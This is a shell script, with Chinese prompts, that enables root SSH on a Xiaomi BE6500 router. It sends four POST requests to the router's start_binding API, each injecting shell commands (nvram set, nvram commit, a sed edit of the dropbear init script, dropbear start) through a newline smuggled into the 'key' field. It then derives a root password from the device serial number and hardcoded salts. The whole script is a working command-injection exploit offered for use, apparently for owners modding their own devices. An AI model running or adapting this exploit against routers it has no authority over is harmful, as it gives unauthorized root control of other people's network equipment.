#!/bin/sh
set -e

verify_root() {
    case "$1" in
        ""|*[!a-zA-Z0-9.-]*|-*) echo "地址格式错误" >&2; return 2 ;;
    esac
    uid=$(ssh -o ConnectTimeout=5 -o HostKeyAlgorithms=+ssh-rsa "root@$1" 'id -u') || {
        echo "SSH 登录失败，无法确认 root 访问。" >&2
        return 1
    }
    [ "$uid" = 0 ] || { echo "远端未返回 UID 0。" >&2; return 1; }
    echo "已验证 $1 的 root SSH 登录。"
}

if [ "$#" -gt 0 ]; then
    if [ "$#" -eq 2 ] && [ "$1" = "--check" ]; then
        verify_root "$2"
        exit $?
    fi
    echo "用法: $0 [--check 路由器地址]" >&2
    exit 2
fi

command -v python3 >/dev/null || { echo "需要 Python 3 解析接口响应。" >&2; exit 1; }
response_ok() {
    printf '%s' "$RESP" | python3 -c '
import json, sys
try:
    code = json.load(sys.stdin)["code"]
except (ValueError, KeyError, TypeError):
    sys.exit("路由器响应缺少有效的状态码")
if type(code) is not int or code != 0:
    sys.exit("路由器返回错误码 %r" % code)
'
}

echo "============================================"
echo "  小米路由器 BE6500 SSH 开启工具"
echo "  Xiaomi BE6500 SSH Enabler"
echo "============================================"
echo ""

# --- Gather inputs ---

printf "请输入路由器的 STOK (stok= 后面的部分): "
read -r STOK

printf "请输入路由器 IP 地址 (默认: 192.168.31.1): "
read -r ROUTER_IP
ROUTER_IP="${ROUTER_IP:-192.168.31.1}"

printf "请输入路由器 SN (序列号, 如 57941/F4U711396): "
read -r SN

echo ""
echo "--- 正在开启 SSH ---"

# --- Build base URL ---
BASE_URL="http://${ROUTER_IP}/cgi-bin/luci/;stok=${STOK}/api/xqsystem/start_binding"

# --- Step 1: enable ssh ---
echo "[1/4] 启用 SSH (nvram set ssh_en=1)..."
RESP=$(curl --fail --show-error --silent --max-time 15 -X POST "$BASE_URL" -d "uid=1234&key=1234'%0Anvram%20set%20ssh_en%3D1'")
if response_ok; then
    echo "  ✓ 成功"
else
    echo "步骤失败，已停止。" >&2
    exit 1
fi

# --- Step 2: commit nvram ---
echo "[2/4] 提交 NVRAM (nvram commit)..."
RESP=$(curl --fail --show-error --silent --max-time 15 -X POST "$BASE_URL" -d "uid=1234&key=1234'%0Anvram%20commit'")
if response_ok; then
    echo "  ✓ 成功"
else
    echo "步骤失败，已停止。" >&2
    exit 1
fi

# --- Step 3: modify dropbear to debug channel ---
echo "[3/4] 修改 dropbear 启动脚本..."
RESP=$(curl --fail --show-error --silent --max-time 15 -X POST "$BASE_URL" -d "uid=1234&key=1234'%0Ased%20-i%20's%2Fchannel%3D.*%2Fchannel%3D%22debug%22%2Fg'%20%2Fetc%2Finit.d%2Fdropbear'")
if response_ok; then
    echo "  ✓ 成功"
else
    echo "步骤失败，已停止。" >&2
    exit 1
fi

# --- Step 4: start dropbear ---
echo "[4/4] 启动 dropbear SSH 服务..."
RESP=$(curl --fail --show-error --silent --max-time 15 -X POST "$BASE_URL" -d "uid=1234&key=1234'%0A%2Fetc%2Finit.d%2Fdropbear%20start'")
if response_ok; then
    echo "  ✓ 成功"
else
    echo "步骤失败，已停止。" >&2
    exit 1
fi

# --- Calculate SSH password from SN ---
echo ""
echo "--- 正在计算 root 密码 ---"

if echo "$SN" | grep -q '/'; then
    SALT="6d2df50a-250f-4a30-a5e6-d44fb0960aa0"
else
    SALT="A2E371B0-B34B-48A5-8C40-A7133F3B5D88"
fi

PASSWORD=$(printf "%s" "${SN}${SALT}" | openssl md5 | awk '{print $2}' | cut -c1-8)

case "$PASSWORD" in
    ????????) printf "旧脚本计算的候选密码为 %s\n" "$PASSWORD" ;;
    *) echo "未得到有效的候选密码，请使用已知的管理凭据。" >&2 ;;
esac
verify_root "$ROUTER_IP"
